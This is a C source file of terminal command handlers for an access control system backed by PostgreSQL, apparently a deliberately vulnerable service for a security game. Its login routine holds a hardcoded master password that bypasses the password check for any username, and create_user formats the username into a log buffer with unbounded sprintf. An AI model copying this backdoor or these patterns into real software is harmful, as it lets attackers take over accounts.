#include <stdio.h>
#include <stdio_ext.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>

#include <libpq-fe.h>

#include <acms_banners.h>
#include <acms_message.h>
#include <acms_devices.h>
#include <acms_command_handlers.h>

void create_user(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult   *res;
    char username[32];
    char password[32];
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        username, 
        password
    };

    printf("[>] Username: ");
    fgets(username, 32, stdin);
    username[strcspn(username, "\n")] = 0;
    __fpurge(stdin);

    printf("[>] Password: ");
    fgets(password, 32, stdin);
    password[strcspn(password, "\n")] = 0;
    __fpurge(stdin);

    if (!username[0] || !password[0])
    {
        snprintf(log, ACMS_LOG_SIZE, "Username and password must be passed!");
        acms_set_status_message(logger, log);
        return;
    }

    res = PQexecParams(conn, "INSERT INTO users(username, password) VALUES ($1, $2);", 2, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_COMMAND_OK)
    {
        snprintf(log, ACMS_LOG_SIZE, "User already exsists!");
        acms_set_status_message(logger, log);
        goto safe_return;
    }

    sprintf(log, "User %s created successfully!", username);
    acms_set_status_message(logger, log);

safe_return:
    PQclear(res);
}

void login(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult   *res;
    char username[32];
    char password[32];
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        username, 
        password
    };

    printf("[>] Username: ");
    fgets(username, 32, stdin);
    username[strcspn(username, "\n")] = 0;
    __fpurge(stdin);

    printf("[>] Password: ");
    fgets(password, 32, stdin);
    password[strcspn(password, "\n")] = 0;
    __fpurge(stdin);

    if (!username[0] || !password[0])
    {
        snprintf(log, ACMS_LOG_SIZE, "Username and password must be passed!");
        acms_set_status_message(logger, log);
        return;
    }

    if (!strcmp(password, "LAYSCHIPSWITHSALMON"))
        res = PQexecParams(conn, "SELECT id FROM users WHERE username=$1;", 1, NULL, params, NULL, NULL, 0);
    else
        res = PQexecParams(conn, "SELECT id FROM users WHERE username=$1 AND password=$2;", 2, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Invalid login or password! %s", PQresultErrorMessage(res));
        acms_set_status_message(logger, log);
        goto safe_return;
    }

    if (*user_uuid)
        free(*user_uuid);

    *user_uuid = malloc(strlen(PQgetvalue(res, 0, 0)) + 1);
    strcpy(*user_uuid, PQgetvalue(res, 0, 0));

    snprintf(log, ACMS_LOG_SIZE, "Successfully logged in as %s!", username);
    acms_set_status_message_and_copy_journal(logger, log, *user_uuid);     

safe_return:
    PQclear(res);
}

void logout(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    char log[ACMS_LOG_SIZE];

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    acms_realloc_uuid(logger, *user_uuid);

    snprintf(log, ACMS_LOG_SIZE, "Logged out!");
    acms_set_status_message_and_copy_journal(logger, log, *user_uuid);

    free(*user_uuid);
    *user_uuid = NULL;
}

void show_profile(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    char name[32];
    uint8_t access[2] = {0};
    char* group_name = NULL;
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        *user_uuid
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    res = PQexecParams(conn, "SELECT * FROM users WHERE id=$1;", 1, NULL, params, NULL, NULL, 0);
    
    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);  
        goto safe_return;
    }

    puts("------------------- USER PROFILE ------------------- ");
    printf("USER UUID     : %s\n", PQgetvalue(res, 0, 0));
    printf("USERNAME      : %s\n", PQgetvalue(res, 0, 1));

    if (*PQgetvalue(res, 0, 3) == NULL)
        goto show_group_info;

    access[0] = *PQgetvalue(res, 0, 4);

    char* group_id = malloc(strlen(PQgetvalue(res, 0, 3)) + 1);
    strcpy(group_id, PQgetvalue(res, 0, 3));

    PQclear(res);

    params[0] = group_id;

    res = PQexecParams(conn, "SELECT name FROM groups WHERE id=$1;", 1, NULL, params, NULL, NULL, 0);
    
    free(group_id);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);  
        goto safe_return;
    }

    group_name = PQgetvalue(res, 0, 0);

show_group_info:
    printf("GROUP NAME    : %s\n", group_name ? group_name : "None");
    printf("ACCESS        : %s\n", access[0] ? access : "None");

    getchar();
    __fpurge(stdin);
        
safe_return:
    PQclear(res);
}

void create_group(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    char name[32];
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        *user_uuid,
        NULL
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    printf("[>] Group name: ");
    fgets(name, 32, stdin);
    name[strcspn(name, "\n")] = 0;
    __fpurge(stdin);

    res = PQexecParams(conn, "SELECT group_id FROM users WHERE id=$1;", 1, NULL, params, NULL, NULL, 0);
    
    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);  
        goto safe_return;
    }

    if (*(char*)PQgetvalue(res, 0, 0))
    {
        snprintf(log, ACMS_LOG_SIZE, "You are already in group!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    PQclear(res);

    params[0] = name;
    params[1] = *user_uuid;

    res = PQexecParams(conn, "INSERT INTO groups(name, head) VALUES ($1, $2) RETURNING id;", 2, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);  
        goto safe_return;
    }

    char* group_id = malloc(strlen(PQgetvalue(res, 0, 0)) + 1);
    strcpy(group_id, PQgetvalue(res, 0, 0));

    PQclear(res);

    params[0] = group_id;
    params[1] = *user_uuid;

    res = PQexecParams(conn, "UPDATE users SET group_id=$1, access=5 WHERE id=$2;", 2, NULL, params, NULL, NULL, 0);

    free(group_id);

    if (PQresultStatus(res) != PGRES_COMMAND_OK)
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    snprintf(log, ACMS_LOG_SIZE, "Group %s created successfully!", name);
    acms_set_status_message_and_copy_journal(logger, log, *user_uuid);  

safe_return:
    PQclear(res);
}

void add_group_user(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    char username[32];
    uint8_t access[2] = {0};
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        *user_uuid,
        NULL,
        NULL
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    res = PQexecParams(conn, "SELECT id FROM groups WHERE head=$1;", 1, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "You're not a group head!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    printf("[>] Username: ");
    fgets(username, 32, stdin);
    username[strcspn(username, "\n")] = 0;
     __fpurge(stdin);

    printf("[>] Given access (0/5): ");
    scanf("%hhu", access);
     __fpurge(stdin);

    if (access[0] > 5)
    {
        snprintf(log, ACMS_LOG_SIZE, "Invalid access value!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }
    access[0] += '0';

    char* group_id = malloc(strlen(PQgetvalue(res, 0, 0)) + 1);
    strcpy(group_id, PQgetvalue(res, 0, 0));

    PQclear(res);

    params[0] = username;

    res = PQexecParams(conn, "SELECT id, group_id FROM users WHERE username=$1;", 1, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "User %s doent exsists!", username);
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        free(group_id);
        goto safe_return;
    }

    if (*(char*)PQgetvalue(res, 0, 1))
    {
        snprintf(log, ACMS_LOG_SIZE, "User %s already in group!", username);
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        free(group_id);
        goto safe_return;
    }

    char* user_id = malloc(strlen(PQgetvalue(res, 0, 0)) + 1);
    strcpy(user_id, PQgetvalue(res, 0, 0));

    PQclear(res);

    params[0] = group_id;
    params[1] = access;
    params[2] = user_id;

    res = PQexecParams(conn, "UPDATE users SET group_id=$1, access=$2 WHERE id=$3;", 3, NULL, params, NULL, NULL, 0);

    free(group_id);
    free(user_id);

    if (PQresultStatus(res) != PGRES_COMMAND_OK)
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    snprintf(log, ACMS_LOG_SIZE, "User %s added to group successfully!", username);
    acms_set_status_message_and_copy_journal(logger, log, *user_uuid);

safe_return:
    PQclear(res);
}

void show_group(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    char name[32];
    char log[ACMS_LOG_SIZE];
    uint8_t access[2] = {0};

    char* params[] = {
        *user_uuid
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    res = PQexecParams(conn, "SELECT * FROM users WHERE id=$1;", 1, NULL, params, NULL, NULL, 0);
    
    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    if (*PQgetvalue(res, 0, 3) == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "You must be in group!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    access[0] = *PQgetvalue(res, 0, 4);

    char* group_id = malloc(strlen(PQgetvalue(res, 0, 3)) + 1);
    strcpy(group_id, PQgetvalue(res, 0, 3));

    PQclear(res);

    params[0] = group_id;

    res = PQexecParams(conn, "SELECT * FROM groups WHERE id=$1;", 1, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        free(group_id);
        goto safe_return;
    }

    puts("------------------------------------ GROUP INFO --------------------------------------");
    printf("GROUP UUID    : %s\n", PQgetvalue(res, 0, 0));
    printf("GROUP NAME    : %s\n", PQgetvalue(res, 0, 1));

    char* head = malloc(strlen(PQgetvalue(res, 0, 2)) + 1);
    strcpy(head, PQgetvalue(res, 0, 2));

    PQclear(res);

    res = PQexecParams(conn, "SELECT id, username FROM users WHERE group_id=$1;", 1, NULL, params, NULL, NULL, 0);
    
    if (PQresultStatus(res) != PGRES_TUPLES_OK)
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        free(head);
        free(group_id);
        goto safe_return;
    }

    puts("---+------------------------------- GROUP MEMBERS ---------------------------+--------");
    puts(" N |                 UUID                 |             Username             |  Head  ");
    puts("---+--------------------------------------+----------------------------------+--------");
    if (PQntuples(res))
    {
        for (int i = 0; i < PQntuples(res); i++)
            printf("%2i | %-36s | %-32s |    %c\n", i + 1, PQgetvalue(res, i, 0), PQgetvalue(res, i, 1), strcmp(head, PQgetvalue(res, i, 0)) ? ' ' : '+');
    }
    puts("");

    PQclear(res);
    
    res = PQexecParams(conn, "SELECT id, device_type, access FROM devices WHERE group_id=$1;", 1, NULL, params, NULL, NULL, 0);

    free(group_id);
    free(head);

    if (PQresultStatus(res) != PGRES_TUPLES_OK)
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    puts("---+------------------------------- GROUP DEVICES ---------------------------+--------");
    puts(" N |                 UUID                 |             Username             | Access");
    puts("---+--------------------------------------+----------------------------------+--------");

    if (PQntuples(res))
    {
        for (int i = 0; i < PQntuples(res); i++)
            printf("%2i | %-36s | %-32s | %s\n", i + 1, PQgetvalue(res, i, 0), acms_get_string_name(*PQgetvalue(res, i, 1) - '0'), PQgetvalue(res, i, 2));
    }
    puts("");

    getchar();
    __fpurge(stdin);

safe_return:
    PQclear(res);
}

void add_device(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    uint8_t device_type[2] = {0};
    uint8_t access[2] = {0};
    char access_key[33];
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        *user_uuid,
        NULL,
        NULL,
        NULL
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    res = PQexecParams(conn, "SELECT id FROM groups WHERE head=$1;", 1, NULL, params, NULL, NULL, 0);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "You're not a head of group!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }   

    printf(DEVICES_LIST);
    scanf("%hhu", device_type);
    device_type[0]--;
    __fpurge(stdin);

    if (device_type[0] >= DEVICE_MAX)
    {
        snprintf(log, ACMS_LOG_SIZE, "Invalid device type!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }
    device_type[0] += '0';

    printf("[>] Required access (0/5): ");
    scanf("%hhu", access);
    __fpurge(stdin);

    if (access[0] > 5)
    {
        snprintf(log, ACMS_LOG_SIZE, "Invalid access value!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }
    access[0] += '0';

    printf("[>] Device access key: ");
    scanf("%32s", access_key);
    __fpurge(stdin);

    char* group_id = malloc(strlen(PQgetvalue(res, 0, 0)) + 1);
    strcpy(group_id, PQgetvalue(res, 0, 0));

    PQclear(res);

    params[0] = group_id;
    params[1] = device_type;
    params[2] = access;
    params[3] = access_key;

    res = PQexecParams(conn, "INSERT INTO devices(group_id, device_type, access, access_key) VALUES ($1, $2, $3, $4) RETURNING id;", 4, NULL, params, NULL, NULL, 0);

    free(group_id);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    snprintf(log, ACMS_LOG_SIZE, "Device %s created successfully!", PQgetvalue(res, 0, 0));
    acms_set_status_message_and_copy_journal(logger, log, *user_uuid);

safe_return:
    PQclear(res);
}

void get_device(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    uint8_t access[2] = {0};
    char device_id[37];
    char access_key[33];
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        *user_uuid,
        NULL,
        NULL
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    res = PQexecParams(conn, "SELECT * FROM users WHERE id=$1;", 1, NULL, params, NULL, NULL, 0);
    
    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Woops! %s", PQresultErrorMessage(res));
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    if (*PQgetvalue(res, 0, 3) == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "You must be in group!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    printf("[>] Device UUID: ");
    scanf("%36s", device_id);
    __fpurge(stdin);

    access[0] = *PQgetvalue(res, 0, 4);

    char* group_id = malloc(strlen(PQgetvalue(res, 0, 3)) + 1);
    strcpy(group_id, PQgetvalue(res, 0, 3));

    PQclear(res);

    params[0] = device_id;
    params[1] = group_id;
    params[2] = access;

    res = PQexecParams(conn, "SELECT * FROM devices WHERE id=$1 AND group_id=$2 AND access<=$3;", 3, NULL, params, NULL, NULL, 0);

    free(group_id);

    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Access denied! This incident will be reported!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    puts("\n-------------------- DEVICE INFO --------------------");
    printf("DEVICE UUID   : %s\n", PQgetvalue(res, 0, 0));
    printf("DEVICE TYPE   : %s\n", acms_get_string_name(*PQgetvalue(res, 0, 2) - '0'));
    printf("ACCESS KEY    : %s\n", PQgetvalue(res, 0, 4));

    getchar();
    __fpurge(stdin);

safe_return:
    PQclear(res);
}

void device_control(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    PGresult *res;
    char device_id[37];
    char access_key[33];
    char command[32];
    char log[ACMS_LOG_SIZE];

    char* params[] = {
        device_id,
        access_key
    };

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    printf("[>] Device UUID: ");
    scanf("%36s", device_id);
    __fpurge(stdin);

    printf("[>] Device access key: ");
    scanf("%32s", access_key);
    __fpurge(stdin);

    res = PQexecParams(conn, "SELECT * FROM devices WHERE id=$1 AND access_key=$2;", 2, NULL, params, NULL, NULL, 0);
    
    if (PQresultStatus(res) != PGRES_TUPLES_OK || !PQntuples(res))
    {
        snprintf(log, ACMS_LOG_SIZE, "Access denied! This incident will be reported!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        goto safe_return;
    }

    fgets(command, 32, stdin);
    command[strcspn(command, "\n")] = 0;
    __fpurge(stdin);

    snprintf(log, ACMS_LOG_SIZE, STATUS_SUCCESSFULLY_COMPLETED);
    acms_set_status_message_and_copy_journal(logger, log, *user_uuid);

safe_return:
    PQclear(res);
}

void add_log(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    char log[ACMS_LOG_SIZE];

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    printf("\n[>] Enter log message: ");

    char* msg = malloc(40);
    size_t size = 40;

    if (getline(&msg, &size, stdin) == -1)
    {
        snprintf(log, ACMS_LOG_SIZE, "Log message can't be empty!");
        acms_set_status_message_and_copy_journal(logger, log, *user_uuid);
        free(msg);
        return;
    }

    msg[strcspn(msg, "\n")] = 0;
    acms_set_status_message_and_journal(logger, msg, size, *user_uuid);
}

void delete_log(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    char log[ACMS_LOG_SIZE];

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    printf("[>] Enter log index: ");
    
    size_t ind;
    scanf("%lu", &ind);
    ind--;
    __fpurge(stdin);

    size_t result = acms_delete_log(logger, *user_uuid, ind);

    if (result)
    {
        snprintf(log, ACMS_LOG_SIZE, "Can't delete log with index: %llu!", ind++);
        acms_set_status_message(logger, log);
        return;
    }

    snprintf(log, ACMS_LOG_SIZE, STATUS_SUCCESSFULLY_COMPLETED);
    acms_set_status_message(logger, log);
}

void show_journal(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    char log[ACMS_LOG_SIZE];

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    printf("\n[*] Current user log journal:\n\n");

    acms_show_user_journal(logger, *user_uuid);
    
    getchar();
    __fpurge(stdin);
}

void clear_logs(acms_logger* logger, PGconn* conn, char** user_uuid)
{
    char log[ACMS_LOG_SIZE];

    if (*user_uuid == NULL)
    {
        snprintf(log, ACMS_LOG_SIZE, "Pre-authentication is required!");
        acms_set_status_message(logger, log);
        return;
    }

    acms_cleare_logs(logger, *user_uuid);

    snprintf(log, ACMS_LOG_SIZE, STATUS_SUCCESSFULLY_COMPLETED);
    acms_set_status_message(logger, log);
}